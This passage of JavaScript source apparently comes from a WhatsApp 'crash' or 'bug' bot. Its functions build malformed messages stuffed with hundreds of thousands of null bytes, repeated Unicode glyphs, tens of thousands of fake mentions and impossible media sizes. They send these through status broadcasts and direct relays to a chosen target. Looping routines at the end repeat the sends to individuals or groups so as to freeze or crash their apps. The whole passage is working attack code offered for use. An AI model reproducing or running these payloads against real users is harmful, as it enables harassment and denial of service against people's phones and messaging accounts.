        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: target } }]
        }]
      }]
    });
    console.log(chalk.green("SUCCESS SEND INVIS"));
  }
}

async function NullInvis(target) {
  let msg = generateWAMessageFromContent(target, {
    interactiveResponseMessage: {
      contextInfo: {
        mentionedJid: Array.from({ length:2000 }, (_, y) => `1313555000${y + 1}@s.whatsapp.net`)
      }, 
      body: {
        text: "\u0000".repeat(200),
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "address_message",
        paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\"Yd7\",\"tower_number\":\"Y7d\",\"city\":\"chindo\",\"name\":\"d7y\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"D | ${"\u0000".repeat(900000)}\"}}`,
        version: 3
      }
    }
  }, { userJid:target });
  
  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
}

async function MonkeyDelay(target) {
const msg = {
viewOnceMessage: {
message: {
interactiveResponseMessage: {
body: {
text: "Scarry Death Version 19 Gen 2" + "ꦽ".repeat(696),
format: "EXTENSIONS_1",
},
nativeFlowResponseMessage: {
name: "galaxy_message",
paramsJson: `{"screen_2_OptIn_0":true,"screen_2_OptIn_1":true,"screen_1_Dropdown_0":"4𝐢𝐳𝐱𝐯𝐞𝐥𝐳 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ","screen_1_DatePicker_1":"1028995200000","screen_1_TextInput_2":"DelayHard","screen_1_TextInput_3":"94643116","screen_0_TextInput_0":"#3izxvelzExerc1st. ‌${"\u0000".repeat(1045000)}","screen_0_TextInput_1":"INFINITE","screen_0_Dropdown_2":"001-Grimgar","screen_0_RadioButtonsGroup_3":"0_true","flow_token":"AQAAAAACS5FpgQ_cAAAAAE0QI3s."}`,
version: 3,
},
},
},
},
};

await sock.relayMessage("status@broadcast", msg, {
messageId: Date.now().toString(),
statusJidList: [target],
additionalNodes: [
{
tag: "meta",
attrs: {},
content: [
{
tag: "mentioned_users",
attrs: {},
content: [
{ tag: "to", attrs: { jid: target }, content: [] }
]
}
]
}
]
});

console.log("Success Send Bug delay🫥");
await new Promise(resolve => setTimeout(resolve, 5000));
}

const sleep = (ms) => new Promise(res => setTimeout(res, ms));


async function EvilEyeBeta(target) {
  try {
    const mentionedList = [
      "13135550002@s.whatsapp.net",
      ...Array.from({ length: 2000 }, () =>
        `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
      )
    ];

    const embeddedMusic = {
      musicContentMediaId: "589608164114571",
      songId: "870166291800508",
      author: "7ooModds" + "ោ៝".repeat(10000),
      title: "Indah <3",
      artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
      artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
      artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
      artistAttribution: "https://www.instagram.com/_u/J.oxyy",
      countryBlocklist: true,
      isExplicit: true,
      artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMsg = {
      videoMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/545780153_1768068347247055_8008910110610321588_n.enc?ccb=11-4&oh=01_Q5Aa2gF45pi45HoFCrDj40WuGbf2qvyU6K3wubsygX5Y_AnGmw&oe=68E66184&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "EY0PNB4nOae0b9/f+tNPB99rJSmJZ/Ns2SEfu7Jc8wI=",
        fileLength: "2534607",
        seconds: 8,
        mediaKey: "YDQMBzXkapRZjXrPVAr2CwEPIBnv6aDHHQLaEYLOPyE=",
        height: 1280,
        width: 720,
        fileEncSha256: "XcTQbrJvO9ICWDBnW8710Ow4QLbygfTUYzP3l0rg0no=",
        directPath: "/v/t62.7161-24/545780153_1768068347247055_8008910110610321588_n.enc?ccb=11-4&oh=01_Q5Aa2gF45pi45HoFCrDj40WuGbf2qvyU6K3wubsygX5Y_AnGmw&oe=68E66184&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1757337021",
        jpegThumbnail: Buffer.from("...base64thumb...", "base64"),
        contextInfo: {
          isSampled: true,
          mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
          newsletterJid: "120363321780343299@newsletter",
          serverMessageId: 1,
          newsletterName: "7ooModds FVerse"
        },
        annotations: [
          {
            embeddedContent: { embeddedMusic },
            embeddedAction: true
          }
        ]
      }
    };

    const stickerMsg = {
      viewOnceMessage: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
            fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
            fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
            mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
            mimetype: "image/webp",
            directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
            fileLength: { low: 1, high: 0, unsigned: true },
            mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
            firstFrameLength: 19904,
            firstFrameSidecar: "KN4kQ5pyABRAgA==",
            isAnimated: true,
            contextInfo: {
              mentionedJid: ["13135550002@s.whatsapp.net"],
              groupMentions: [],
              entryPointConversionSource: "non_contact",
              entryPointConversionApp: "whatsapp",
              entryPointConversionDelaySeconds: 467593
            },
            stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
            isAvatar: true,
            isAiSticker: true,
            isLottie: true
          }
        }
      }
    };

    const biji = await generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              body: {
                text: "You Idiot's",
                format: "DEFAULT"
              },
              nativeFlowResponseMessage: {
                name: "call_permission_request",
                paramsJson: "\x10".repeat(1045000),
                version: 3
              },
              entryPointConversionSource: "galaxy_message"
            }
          }
        }
      },
      {
        ephemeralExpiration: 0,
        forwardingScore: 9741,
        isForwarded: true,
        font: Math.floor(Math.random() * 99999999),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "999999")
      }
    );

    await sock.relayMessage("status@broadcast", biji.message, {
      messageId: biji.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
            }
          ]
        }
      ]
    });
    await sleep(1000); // sᴇᴛᴛɪɴɢ ᴀᴊᴀ 

    await sock.relayMessage("status@broadcast", videoMsg, {
      messageId: "EvilEye-" + Date.now(),
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
            }
          ]
        }
      ]
    });
    await sleep(1000); // sᴇᴛᴛɪɴɢ ᴀᴊᴀ 

    await sock.relayMessage("status@broadcast", stickerMsg, {
      messageId: "Sticker-" + Date.now(),
      statusJidList: [target]
    });
    await sleep(1000); // sᴇᴛᴛɪɴɢ ᴀᴊᴀ 

    console.log(chalk.red(`Attack Delay : ${target}`));
  } catch (err) {
    console.error("Delay Error:", err);
  }
}

async function tes11(target) {
  const msg = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        videoMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
          mimetype: "video/mp4",
          fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
          fileLength: "8228828282282828828",
          seconds: 9999999,
          mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
          height: 640,
          width: 640,
          fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
          directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1743848703",
          contextInfo: {
            isSampled: true,
            mentionedJid: [
              "13135550002@s.whatsapp.net",
              ...Array.from({length: 40000}, () => `1${Math.floor(Math.random() * 50000000)}@s.whatsapp.net`)
            ]
          },
          annotations: [],
          thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
          thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
          thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k="
        }
      }
    }
  }, { stanzaId: `${Date.now()}` });

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
      }]
    }]
  });

  if (target) {
    await sock.relayMessage(target, {
      groupStatusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          }
        }
      }
    }, {
      additionalNodes: [{
        tag: "meta",
        attrs: { is_status_mention: "" },
        content: undefined
      }]
    });
  }
}

async function xatanicaldelayv2(target) {
  console.log(chalk.blue(`Delay Hard V2 To Target ${target}`));
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}

async function tes23(target) {
  let buttons = [
    {
      name: "single_select",
      buttonParamsJson: "",
    },
  ];
  
  for(let i = 0; i < 15; i++) {
    buttons.push(
      {
        name: "cta_call",
        buttonParamsJson: JSON.stringify({
          display_text: "ꦽ".repeat(3000),
        }),
      },
      {
        name: "cta_copy",
        buttonParamsJson: JSON.stringify({
          display_text: "ꦽ".repeat(3000),
        }),
      },
      {
        name: "quick_reply",
        buttonParamsJson: JSON.stringify({
          display_text: "ꦽ".repeat(3000),
        }),
      },
    );
  }

  let msg = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "XCloseCrash",
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc?ccb=11-4&oh=01_Q5Aa1QFfR6NCmADbYCPh_3eFOmUaGuJun6EuEl6A4EQ8r_2L8Q&oe=68243070&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
              fileSha256: "MWxzPkVoB3KD4ynbypO8M6hEhObJFj56l79VULN2Yc0=",
              fileLength: "999999999999",
              pageCount: 1316134911,
              mediaKey: "lKnY412LszvB4LfWfMS9QvHjkQV4H4W60YsaaYVd57c=",
              fileName: "OndetAsbakBali" + "ꦾ".repeat(20000),
              fileEncSha256: "aOHYt0jIEodM0VcMxGy6GwAIVu/4J231K349FykgHD4=",
              directPath: "/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc?ccb=11-4&oh=01_Q5Aa1QFfR6NCmADbYCPh_3eFOmUaGuJun6EuEl6A4EQ8r_2L8Q&oe=68243070&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1743848703",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDABsSFBcUERsXFhceHBsgKEIrKCUlKFE6PTBCYFVlZF9VXVtqeJmBanGQc1tdhbWGkJ6jq62rZ4C8ybqmx5moq6T/2wBDARweHigjKE4rK06kbl1upKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKT/wgARCABIAEgDASIAAhEBAxEB/8QAGgAAAgMBAQAAAAAAAAAAAAAAAAUCAwQBBv/EABcBAQEBAQAAAAAAAAAAAAAAAAABAAP/2gAMAwEAAhADEAAAAN6N2jz1pyXxRZyu6NkzGrqzcHA0RukdlWTXqRmWLjrUwTOVm3OAXETtFZa9RN4tCZzV18lsll0y9OVmbmkcpbJslDflsuz7JafOepX0VEDrcjDpT6QLC4DrxaFFgHL/xAAaEQADAQEBAQAAAAAAAAAAAAAAARExAhEh/9oACAECAQE/AELJqiE/ELR5EdaJmxHWxfIjqLZ//8QAGxEAAgMBAQEAAAAAAAAAAAAAAAECEBEhMUH/2gAIAQMBAT8AZ9MGsdMzTcQuumR8GjymQfCQ+0yIxiP/xAArEAABBAECBQQCAgMAAAAAAAABAAIDEQQSEyIiIzFRMjNBYRBxExQkQoH/2gAIAQEAAT8Af6Ssn3SpXbWEpjHOcOHAlN6MQBJH6RiMkJdRIWVEYnhwYWg+VpJt5P1+H+g/pZHulZR6axHi9rvjso5GuYLFoT7H7QWgFavKHMY0UeK0U8zx4QUh5D+lOeqVMLYq2vFeVE7YwX2pFsN73voLKnEs1t9I7LRPU8/iU9MqX3Sn8SGjiVj6PNJUjxtHhTROiG1wpZwqNfC0Rwp4+UCpj0yp3U8laVT5nSEXt7KGUnushjZG0Ra1DEP8ZrsFR7LTZjFMPB7o8zeB7qc9IrI4ly0bvIozRRNttSMEsZ+1qGG6CQuA5So3U4LFdugYT4U/tFS+py0w0ZKUb7ophtqigdt+lPiNkjLJACCs/Tn4jt92wngVhH/GZfhZHtFSnmctNcf7JYP9kIzHVnuojwUMlNpSPBK1Pa/DeD/xQ8uG0fJCyT0isg1axH7MpjvtSDcy1A6xSc4jsi/gtQyDyx/LioySA34C//4AAwD/2Q==",
              streamingSidecar: "APsZUnB5vlI7z28CA3sdzeI60bjyOgmmHpDojl82VkKPDp4MJmhpnFo0BR3IuFKF8ycznDUGG9bOZYJc2m2S/H7DFFT/nXYatMenUXGzLVI0HuLLZY8F1VM5nqYa6Bt6iYpfEJ461sbJ9mHLAtvG98Mg/PYnGiklM61+JUEvbHZ0XIM8Hxc4HEQjZlmTv72PoXkPGsC+w4mM8HwbZ6FD9EkKGfkihNPSoy/XwceSHzitxjT0BokkpFIADP9ojjFAA4LDeDwQprTYiLr8lgxudeTyrkUiuT05qbt0vyEdi3Z2m17g99IeNvm4OOYRuf6EQ5yU0Pve+YmWQ1OrxcrE5hqsHr6CuCsQZ23hFpklW1pZ6GaAEgYYy7l64Mk6NPkjEuezJB73vOU7UATCGxRh57idgEAwVmH2kMQJ6LcLClRbM01m8IdLD6MA3J3R8kjSrx3cDKHmyE7N3ZepxRrbfX0PrkY46CyzSOrVcZvzb/chy9kOxA6U13dTDyEp1nZ4UMTw2MV0QbMF6n94nFHNsV8kKLaDberigsDo7U1HUCclxfHBzmz3chng0bX32zTyQesZ2SORSDYHwzU1YmMbSMahiy3ciH0yQq1fELBvD5b+XkIJGkCzhxPy8+cFZV/4ATJ+wcJS3Z2v7NU2bJ3q/6yQ7EtruuuZPLTRxWB0wNcxGOJ/7+QkXM3AX+41Q4fddSFy2BWGgHq6LDhmQRX+OGWhTGLzu+mT3WL8EouxB5tmUhtD4pJw0tiJWXzuF9mVzF738yiVHCq8q5JY8EUFGmUcMHtKJHC4DQ6jrjVCe+4NbZ53vd39M792yNPGLS6qd8fmDoRH",
              thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
              thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
              thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
              artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
              artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
              artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
              artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
            },
            hasMediaAttachment: true,
          },
          body: {
            text: "ꦽ".repeat(25000) + "ꦾ".repeat(35000),
          },
          nativeFlowMessage: {
            buttons: buttons,
            messageParamsJson: "[{".repeat(25000),
          },
          contextInfo: {
            stanzaId: Math.floor(Math.random() * 99999).toString(),
            isForwarded: true,
            forwardingScore: 999,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 800 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"),
            ],
            quotedMessage: {
              locationMessage: {
                degreesLatitude: 999999999,
                degreesLongitude: -999999999,
                name: '{'.repeat(15000),
                address: '{'.repeat(15000)
              }
            }
          },
        }
      }
    }
  }, {});

  await sock.relayMessage(target, msg.message, {
    messageId: msg.key.id
  });
}

//-----------------------( PEMANGGIL FUNC  )------------------------\\
async function delayraraa1(target) {
    for (let i = 0; i < 20; i++) {
    await tes11(target);
    await tes23(target);
    await MonkeyDelay(target);
    await EvilEyeBeta(target);
    await new Promise((res) => setTimeout(res, 8000));
    console.log(chalk.yellow(`SEND BUGS SCARRY DEATH`));
    }
    }
    
    async function delayraraa2(target) {
    for (let i = 0; i < 20; i++) {
    await tes11(target);
    await tes23(target);
    await MonkeyDelay(target);
    await EvilEyeBeta(target);
    await new Promise((res) => setTimeout(res, 8000));
    console.log(chalk.yellow(`SCARRY DEATH`));
    }
    }
    
    async function delayraraa3(target) {
    for (let i = 0; i < 20; i++) {
    await tes11(target);
    await tes23(target);
    await MonkeyDelay(target);
    await EvilEyeBeta(target);
    await new Promise((res) => setTimeout(res, 8000));
    console.log(chalk.yellow(`SCARRY DEATH`));
    }
    }
    
    
    
    async function blankraraa1(target) {
    for (let i = 0; i < 15; i++) {
    await urllocdroid(target);
    await newsLetter(target);
    await LocationUi(target);
    await FrezeeUi(target);
    await Frezeblank(target);
    await LocationFreze(target);
    await locaX(target);
    await locaXx(target);
    await new Promise((res) => setTimeout(res, 10000));
    console.log(chalk.yellow(`SEND BUGS SCARRY DEATH`));
    }
    }
    
        
    async function blankraraa2(target) {
    for (let i = 0; i < 15; i++) {
    await AxMaker2(target);
    await jembutLebat(target);
    await delayJembut(target);
    await BoengHrad(target);
    await new Promise((res) => setTimeout(res, 9000));
    console.log(chalk.yellow(` SEND BUGS SCARRY DEATH`));
    }
    }
    
    async function blankraraa3(target) {
    for (let i = 0; i < 15; i++) {
    await urllocdroid(target);
    await newsLetter(target);
    await LocationUi(target);
    await FrezeeUi(target);
    await Frezeblank(target);
    await LocationFreze(target);
    await locaX(target);
    await locaXx(target);
    await new Promise((res) => setTimeout(res, 10000));
    console.log(chalk.yellow(`SEND BUGS SCARRY DEATH`));
    }
    }
    
    async function forceraraa1(target) {
    for (let i = 0; i < 20; i++) {
    await StickerSplit(target);
    await new Promise((res) => setTimeout(res, 7000));
    console.log(chalk.yellow(`SEND BUGS SCARRY DEATH`));
    }
    }
    
    
    async function forceraraa2(target) {
    for (let i = 0; i < 20; i++) {
    await NullInvis(target);
    await new Promise((res) => setTimeout(res, 7000));
    console.log(chalk.yellow(`SCARRY DEATH`));
    }
    }
    
        
    async function iosraraa1(target) {
    for (let i = 0; i < 15; i++) {
    await fcinfinityori(target);
    await new Promise((res) => setTimeout(res, 8000));
    console.log(chalk.yellow(`SCARRY DEATH`));
    }
    }
    
    
        
    async function iosraraa2(target) {
    for (let i = 0; i < 15; i++) {
    await fcinfinityori(target);
    await new Promise((res) => setTimeout(res, 8000));
    console.log(chalk.yellow(`SCARRY DEATH`));
    }
    }
    

    async function iosraraa3(target) {
    for (let i = 0; i < 15; i++) {
    await fcinfinityori(target);
    await new Promise((res) => setTimeout(res, 8000));
    console.log(chalk.yellow(`SCARRY DEATH`));
    }
    }


   async function grubraraa1(groupJid) {
   for (let i = 0; i < 20; i++) {
    await FreezeGC(groupJid);
    await new Promise((res) => setTimeout(res, 7000));
    console.log(chalk.yellow(`SCARRY DEATH`));
    }
    }
